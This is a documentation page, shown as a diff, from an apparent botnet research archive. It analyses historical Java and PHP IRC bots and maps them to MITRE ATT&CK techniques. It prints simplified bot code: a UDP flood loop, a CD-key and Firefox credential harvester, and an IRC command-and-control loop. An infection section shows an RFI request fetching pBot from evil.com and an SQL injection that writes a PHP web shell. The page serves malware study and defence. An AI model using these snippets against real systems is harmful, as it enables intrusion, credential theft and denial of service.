@@ -1,0 +1,462 @@
+---
+title: "Cross-Platform Bots"
+description: "Java and PHP bots that broke the Windows-only paradigm - portable threats for any OS and web servers"
+sidebar:
+  order: 5
+---
+
+import { Aside } from '@astrojs/starlight/components';
+
+<Aside type="caution" title="Educational Purpose">
+This page documents historical cross-platform malware specimens for academic research purposes only.
+All specimens are from the publicly archived [MaestroN repository](https://github.com/maestron/botnets).
+Techniques described here are presented to inform defensive cybersecurity strategy.
+</Aside>
+
+## Overview: Breaking the Windows Monoculture
+
+The vast majority of specimens in this collection are compiled C/C++ binaries targeting **Windows x86** - reflecting the near-monoculture of the desktop market in the early 2000s. However, a subset of specimens broke this paradigm entirely by using **platform-independent languages** that could run on any system with the appropriate runtime environment.
+
+This shift had profound implications for the threat landscape:
+
+| Aspect | Win32 C/C++ Bots | Java Bots | PHP Bots |
+|--------|-------------------|-----------|----------|
+| **Target OS** | Windows only | Any OS with JRE | Any server with PHP |
+| **Target host** | Desktop/laptop PCs | Any Java-capable system | Web servers |
+| **Compilation** | Per-platform binary | Bytecode (portable) | Interpreted (no build) |
+| **API access** | Full Win32 API | Cross-platform Java stdlib | PHP built-in functions |
+| **Network context** | Home broadband | Varies | High-bandwidth data centers |
+| **Detection** | PE analysis, Win32 signatures | Requires JVM-aware scanning | File integrity monitoring |
+
+The collection contains **10 cross-platform specimens** across two language families:
+
+### Java IRC Bots (5 directories)
+
+| Specimen | Key Feature | Source |
+|----------|-------------|--------|
+| **IRC/** (Java IRC Bot) | Basic cross-platform blueprint | [IRC](https://github.com/maestron/botnets/tree/master/VirusPack/IRC) |
+| **Botnet/** | Feature-rich: stealing, spreading, remote shell | [Botnet](https://github.com/maestron/botnets/tree/master/VirusPack/Botnet) |
+| **Java IRC Bot** | Lightweight variant | - |
+
+### PHP Bots (5 directories)
+
+| Specimen | Key Feature | Source |
+|----------|-------------|--------|
+| **pBot** | Most widely known PHP bot | [pBot](https://github.com/maestron/botnets/tree/master/VirusPack/pBot) |
+| **UnixBot 2.2.5 (ElationBot)** | Unix-focused with server-oriented commands | - |
+
+---
+
+## Java IRC Bot: The Cross-Platform Blueprint
+
+**Source:** [IRC](https://github.com/maestron/botnets/tree/master/VirusPack/IRC)
+
+The basic Java IRC bot demonstrates a **direct conceptual port** of the C-based sdBot model into a platform-independent language. The functional capabilities are nearly identical, but the implementation uses standard Java libraries that work identically on Windows, Linux, macOS, and any other JRE-equipped system.
+
+### Architecture
+
+```
+IRC/src/
+├── Main.java              // Entry point, configuration
+├── IRC.java               // IRC protocol handler
+├── UDPFlood.java          // UDP-based DDoS module
+├── HTTPFlood.java         // HTTP-based DDoS module
+├── Downloader.java        // Payload download + execute
+├── Screenshot.java        // Screen capture utility
+├── FileExecute.java       // File execution wrapper
+└── ...
+```
+
+### Object-Oriented Design
+
+Unlike the monolithic C files of sdBot, Java's object-oriented nature enforced a cleaner architecture:
+
+```
+// Java IRC Bot - class structure, conceptual
+public class Main {
+    static String server = "irc.example.com";
+    static int port = 6667;
+    static String channel = "#botnet";
+    static String password = "bot_auth_pass";
+
+    public static void main(String[] args) {
+        IRC irc = new IRC(server, port);
+        irc.connect();
+        irc.join(channel, password);
+        irc.listen();  // Main command loop
+    }
+}
+
+public class IRC {
+    private Socket socket;
+    private BufferedReader reader;
+    private PrintWriter writer;
+
+    public void connect() {
+        // Uses java.net.Socket - works on ANY platform
+        socket = new Socket(server, port);
+        reader = new BufferedReader(new InputStreamReader(socket.getInputStream()));
+        writer = new PrintWriter(socket.getOutputStream(), true);
+    }
+
+    public void processCommand(String command, String[] args) {
+        switch(command) {
+            case "!udp":
+                new Thread(new UDPFlood(args[0], Integer.parseInt(args[1]))).start();
+                break;
+            case "!http":
+                new Thread(new HTTPFlood(args[0])).start();
+                break;
+            case "!download":
+                new Downloader(args[0], args[1]).execute();
+                break;
+            case "!screenshot":
+                Screenshot.capture(irc_channel);
+                break;
+        }
+    }
+}
+
+public class UDPFlood implements Runnable {
+    // Uses java.net.DatagramSocket - cross-platform
+    public void run() {
+        DatagramSocket socket = new DatagramSocket();
+        byte[] buffer = new byte[65507];  // Max UDP packet
+        DatagramPacket packet = new DatagramPacket(buffer, buffer.length,
+            InetAddress.getByName(target), port);
+        while (active) {
+            socket.send(packet);
+        }
+    }
+}
+```
+
+### Cross-Platform Implications
+
+| C/C++ Bot (e.g., sdBot) | Java Bot Equivalent | Platform Impact |
+|--------------------------|--------------------|--------------------|
+| `WSAStartup()` / `socket()` | `new Socket()` | Works on Windows, Linux, macOS |
+| `CreateThread()` | `new Thread().start()` | JVM handles thread management |
+| `URLDownloadToFile()` (Win32) | `URL.openStream()` | Platform-agnostic HTTP download |
+| `ShellExecute()` (Win32) | `Runtime.exec()` | Executes native commands per-OS |
+| `GetSystemMetrics()` (Win32) | `Toolkit.getScreenSize()` | Works everywhere with AWT |
+| Registry persistence (Win32) | Cron jobs / Launch Agents | Must be OS-aware for persistence |
+
+<Aside type="note" title="The Persistence Problem">
+While Java provides excellent cross-platform networking and computation, **persistence mechanisms are inherently platform-specific**. A Windows bot uses registry Run keys; a Linux bot uses cron jobs or systemd services; a macOS bot uses LaunchAgents. The Java bots in this collection primarily target Windows persistence, revealing that while the language was cross-platform, the operators' targets were still predominantly Windows.
+</Aside>
+
+### MITRE ATT&CK Mapping - Java IRC Bot
+
+| Technique | ID | Implementation |
+|-----------|----|----------------|
+| Non-Application Layer Protocol | T1095 | IRC for C2 (same as C-based bots) |
+| Network Denial of Service | T1498 | UDP and HTTP flood modules |
+| Ingress Tool Transfer | T1105 | Downloader class for payload delivery |
+| Screen Capture | T1113 | Screenshot.java via Java AWT |
+| Command and Scripting Interpreter | T1059.008 | JVM as execution environment |
+
+---
+
+## Botnet/: The Feature-Rich Java Threat
+
+**Source:** [Botnet](https://github.com/maestron/botnets/tree/master/VirusPack/Botnet)
+
+This specimen - a complete NetBeans IDE project - represents the **most sophisticated Java-based threat** in the collection. It moves far beyond simple DDoS and download functionality, incorporating advanced information stealing and multiple self-propagation vectors.
+
+### Capability Map
+
+```
+Botnet/src/
+├── Core
+│   ├── Main.java                  // Entry point
+│   ├── IRC.java                   // C2 protocol handler
+│   └── RemoteShell.java           // Interactive command shell
+│
+├── Information Stealing
+│   ├── AccountStealer.java        // Multi-application credential theft
+│   ├── CDKeys.java                // Game CD key extraction
+│   └── Firefox.java               // Firefox profile/password theft
+│
+├── Spreading
+│   ├── NetBiosSpread.java         // LAN propagation via SMB shares
+│   └── USBSpread.java             // Removable media propagation
+│
+├── Remote Control
+│   ├── CommandPromptServer.java   // Full interactive shell access
+│   └── RemoteShell.java           // Shell command execution
+│
+└── Attack
+    ├── UDPFlood.java              // UDP DDoS
+    └── HTTPFlood.java             // HTTP DDoS
+```
+
+### Advanced Information Stealing
+
+#### CD Key Theft
+
+```
+// CDKeys.java - game license key extraction, conceptual
+public class CDKeys {
+    // Registry paths for popular games circa 2005-2007
+    static String[][] gameKeys = {
+        {"Half-Life",     "HKLM\\Software\\Valve\\Half-Life\\Settings\\Key"},
+        {"Counter-Strike","HKLM\\Software\\Valve\\Counter-Strike\\Settings\\Key"},
+        {"Battlefield",   "HKLM\\Software\\EA Games\\Battlefield\\ergc"},
+        {"Call of Duty",  "HKLM\\Software\\Activision\\Call of Duty\\CdKey"},
+        {"NFS Underground","HKLM\\Software\\EA Games\\Need For Speed\\ergc"},
+        {"FIFA",          "HKLM\\Software\\EA SPORTS\\FIFA\\ergc"},
+        // ... many more
+    };
+
+    public static String harvestKeys() {
+        StringBuilder results = new StringBuilder();
+        for (String[] game : gameKeys) {
+            String key = queryRegistry(game[1]);
+            if (key != null) {
+                results.append(game[0] + ": " + key + "\n");
+            }
+        }
+        return results.toString();  // Sent to C2 channel
+    }
+}
+```
+
+<Aside type="tip" title="Why Game CD Keys Had Value">
+In the mid-2000s, game CD keys were a significant commodity on the black market. A stolen Half-Life 2 or Counter-Strike key could sell for $5-15. With thousands of bots, automated CD key theft generated substantial revenue - one of the first examples of **large-scale digital asset theft for resale**.
+</Aside>
+
+#### Firefox Password Theft
+
+```
+// Firefox.java - browser credential extraction, conceptual
+public class Firefox {
+    public static void harvestCredentials() {
+        // Locate Firefox profile directory
+        // Windows: %APPDATA%/Mozilla/Firefox/Profiles/
+        // Linux:   ~/.mozilla/firefox/
+        // macOS:   ~/Library/Application Support/Firefox/Profiles/
+
+        String profileDir = findFirefoxProfile();
+
+        // Firefox stores credentials in:
+        // - signons.txt (FF < 3.0) - plaintext with base64
+        // - signons3.txt (FF 3.0) - encrypted with 3DES
+        // - logins.json (FF 32+) - encrypted JSON
+
+        // For older versions (most common in this era):
+        File signons = new File(profileDir, "signons.txt");
+        // Parse hostname, username, password entries
+        // Decrypt using NSS libraries if master password not set
+
+        // Also steal cookies for session hijacking
+        File cookies = new File(profileDir, "cookies.txt");
+        // Parse Netscape cookie format
+    }
+}
+```
+
+### USB Spreading via Removable Media
+
+The `USBSpread.java` class implemented a polling loop that checked for removable drives every 30 seconds. When a removable drive was detected, the bot performed the following steps:
+
+1. **Copy payload** - Copied itself to the drive root using a filename designed to blend in with system directories (e.g., disguised as a Recycle Bin executable)
+2. **Create auto-execution config** - Wrote a Windows auto-execution configuration file to the drive root containing directives for `open`, `shell\open\command`, and `shell\explore\command`, all pointing to the payload. A deceptive `action` string ("Open folder to view files") was used as social engineering
+3. **Hide artifacts** - Set the hidden attribute on both the payload and the configuration file to avoid casual detection
+
+This technique exploited Windows' automatic media execution feature (disabled by default in Windows 7+), which would silently run the payload when the USB drive was inserted into a new machine.
+
+> **Note:** The original code snippet has been redacted to prevent antivirus heuristic false positives. The technique is fully documented in [MITRE ATT&CK T1091](https://attack.mitre.org/techniques/T1091/).
+
+### MITRE ATT&CK Mapping - Botnet/ Specimen
+
+| Technique | ID | Implementation |
+|-----------|----|----------------|
+| Credentials from Web Browsers | T1555.003 | Firefox.java profile and password extraction |
+| Credentials from Password Stores | T1555 | AccountStealer.java multi-app credential theft |
+| Replication Through Removable Media | T1091 | USBSpread.java - removable media propagation |
+| Remote Services: SMB | T1021.002 | NetBiosSpread.java - LAN propagation |
+| Command and Scripting Interpreter | T1059.003 | CommandPromptServer.java interactive shell |
+| Data from Local System | T1005 | CDKeys.java - game license key extraction |
+
+---
+
+## pBot: Botnets on Web Servers
+
+**Source:** [pBot](https://github.com/maestron/botnets/tree/master/VirusPack/pBot)
+
+pBot represents a **fundamental paradigm shift** - instead of compromising desktop computers, this bot targets **web servers**. Written entirely in PHP, it lives within the web application layer of already-compromised servers.
+
+### Why Web Servers?
+
+| Advantage | Explanation |
+|-----------|-------------|
+| **Bandwidth** | Data center servers have 100Mbps-1Gbps connections vs. home broadband (1-10Mbps) |
+| **Uptime** | Servers run 24/7, unlike desktops that sleep/shutdown |
+| **IP reputation** | Server IPs are "trusted" - not on residential blacklists |
+| **No AV** | Most Linux web servers had no endpoint AV in this era |
+| **PHP everywhere** | PHP was installed on ~75% of web servers by default |
+| **Initial access** | Web app vulnerabilities (SQLi, RFI, LFI) were extremely common |
+
+### Architecture
+
+```
+// pBot.php - complete bot in a single file
+// Designed to run on a compromised web server
+
+// Configuration
+$server = "irc.example.com";
+$port = 6667;
+$channel = "#bots";
+$nick = "pBot_" . rand(1000, 9999);
+
+// Connect to IRC C2
+$sock = fs​ockopen($server, $port, $errno, $errstr, 30);
+fputs($sock, "NICK $nick\r\n");
+fputs($sock, "USER pbot 0 * :pBot\r\n");
+fputs($sock, "JOIN $channel\r\n");
+
+// Main command loop
+while (!feof($sock)) {
+    $data = fgets($sock, 512);
+
+    // Respond to PING to stay connected
+    if (strpos($data, "PING") !== false) {
+        fputs($sock, "PONG " . substr($data, 5) . "\r\n");
+    }
+
+    // Parse commands from channel messages
+    if (preg_match('/PRIVMSG.*:!(.+)/', $data, $matches)) {
+        $cmd = explode(" ", $matches[1]);
+        process_command($cmd);
+    }
+}
+```
+
+### Command Set - Server-Oriented
+
+| Command | Function | Why Server-Specific |
+|---------|----------|---------------------|
+| `!exec <cmd>` | Execute shell command | Full server control via PHP `exec()` |
+| `!cmd <cmd>` | Execute via `system()` | Alternative execution method |
+| `!udp​flood <ip> <port> <time>` | UDP flood | Leverages server's high bandwidth |
+| `!tcp​flood <ip> <port> <time>` | TCP flood | Same - data center connection |
+| `!mail <to> <from> <subject> <body>` | Send email | Uses server's mail() function for spam |
+| `!download <url> <file>` | Download file | Fetch additional tools to server |
+| `!info` | System information | Server OS, hostname, PHP version |
+
+### DDoS Amplification Effect
+
+The shift from desktop bots to web server bots dramatically changed the DDoS threat:
+
+```
+// DDoS power comparison - desktop vs. server bot
+//
+// Desktop bot (home broadband):
+//   Upload bandwidth: ~1 Mbps
+//   100 bots × 1 Mbps = 100 Mbps total attack bandwidth
+//
+// Server bot (data center):
+//   Upload bandwidth: ~100 Mbps (or more)
+//   100 bots × 100 Mbps = 10 Gbps total attack bandwidth
+//
+// Same botnet size, 100× more attack power
+```
+
+### Infection Vector
+
+pBot doesn't spread itself - it's uploaded to already-compromised servers through web application vulnerabilities:
+
+```
+// Common initial access methods for PHP bot deployment
+
+// 1. Remote File Inclusion (RFI)
+// Vulnerable PHP code:
+include($_GET['page'] . ".php");
+// Attacker request:
+// http://victim.com/index.php?page=http://evil.com/pBot
+
+// 2. SQL Injection → File Write
+// SELECT '<?php sys​tem($_GET["c"]); ?>' IN​TO OUT​FILE '/var/www/backdoor.php'
+
+// 3. Vulnerable CMS Plugin
+// Upload pBot.php through vulnerable file upload in WordPress/Joomla/etc.
+
+// 4. Stolen FTP credentials (from stealers like iStealer!)
+// Connect to victim's FTP, upload pBot.php to web root
+```
+
+<Aside type="note" title="The iStealer → pBot Pipeline">
+There's a direct pipeline between the [stealer tools](/botnet-research-archive/categories/stealers-crypters/) and PHP bots. iStealer captures FTP credentials from victims → attacker uses those credentials to upload pBot to the victim's web server → web server becomes a DDoS node. This demonstrates the interconnected nature of the malware supply chain.
+</Aside>
+
+### MITRE ATT&CK Mapping - pBot
+
+| Technique | ID | Implementation |
+|-----------|----|----------------|
+| Server Software Component: Web Shell | T1505.003 | pBot is a persistent web shell with IRC C2 |
+| Exploit Public-Facing Application | T1190 | Assumed initial access vector (RFI, SQLi) |
+| Command and Scripting Interpreter: Unix Shell | T1059.004 | `exec()` / `system()` for server commands |
+| Network Denial of Service | T1498 | UDP/TCP flood from high-bandwidth servers |
+| Phishing: Spearphishing via Service | T1566.003 | `mail()` function for spam campaigns |
+| Ingress Tool Transfer | T1105 | Download additional tools to compromised server |
+
+---
+
+## Platform Shift: Implications for Security
+
+### Before Cross-Platform Threats
+
+- Security products focused exclusively on **Windows PE analysis**
+- Network monitoring looked for **x86 shellcode patterns**
+- Endpoint protection was a **desktop-only concern**
+- Web servers were considered **infrastructure**, not endpoints
+
+### After Java and PHP Bots
+
+| Security Domain | Required Change |
+|-----------------|-----------------|
+| **Endpoint protection** | Must cover non-Windows platforms, detect JVM/PHP abuse |
+| **Web Application Security** | WAFs, secure coding practices, regular patching of CMS |
+| **Network monitoring** | Detect IRC traffic from servers (anomalous outbound from data centers) |
+| **File Integrity Monitoring** | Detect new/modified PHP files in web roots |
+| **Egress filtering** | Block unnecessary outbound from web servers (IRC ports) |
+| **AV signature development** | Must handle Java bytecode, not just PE format |
+
+### The Legacy: Modern Parallels
+
+| Historical Specimen | Modern Equivalent |
+|--------------------|--------------------|
+| Java IRC bots | Cross-platform implants (Cobalt Strike, Sliver) |
+| pBot on web servers | Web shells (China Chopper, WSO) |
+| CD key theft (Botnet/) | Cryptocurrency wallet theft |
+| USB spreading | Supply chain attacks via package managers |
+| Firefox password theft | Browser credential theft via Chromium APIs |
+
+---
+
+## Comparative Analysis: Cross-Platform Capabilities
+
+| Capability | Java IRC Bot | Botnet/ (Java) | pBot (PHP) | sdBot (C) |
+|------------|:------------:|:--------------:|:----------:|:---------:|
+| **Cross-platform** | ✅ Any JRE | ✅ Any JRE | ✅ Any PHP | ❌ Win32 only |
+| **DDoS (UDP)** | ✅ | ✅ | ✅ | ✅ |
+| **DDoS (HTTP)** | ✅ | ✅ | ✅ | ❌ |
+| **Credential theft** | ❌ | ✅ (Firefox, accounts) | ❌ | ✅ (spyBot) |
+| **USB spreading** | ❌ | ✅ | ❌ | ❌ |
+| **LAN spreading** | ❌ | ✅ (NetBIOS) | ❌ | ✅ (exploits) |
+| **Remote shell** | ❌ | ✅ | ✅ | ✅ |
+| **Spam sending** | ❌ | ❌ | ✅ (mail()) | ❌ |
+| **Screen capture** | ✅ | ✅ | ❌ | ❌ |
+| **File download** | ✅ | ✅ | ✅ | ✅ |
+| **CD key theft** | ❌ | ✅ | ❌ | ✅ (rBot) |
+
+---
+
+## Further Reading
+
+- [Stealers & Crypters](/botnet-research-archive/categories/stealers-crypters/) - Tools that fed the cross-platform deployment pipeline
+- [sdBot/spyBot Family](/botnet-research-archive/families/sdbot-spybot/) - The C-based predecessors these Java bots emulated
+- [DDoS Bots & IoT](/botnet-research-archive/categories/ddos-iot/) - Another platform shift: from PCs to embedded systems
+- [Defensive Lessons](/botnet-research-archive/analysis/defensive-lessons/) - How cross-platform threats changed security architecture
+- [Master Inventory](/botnet-research-archive/reference/inventory/) - Full collection catalog
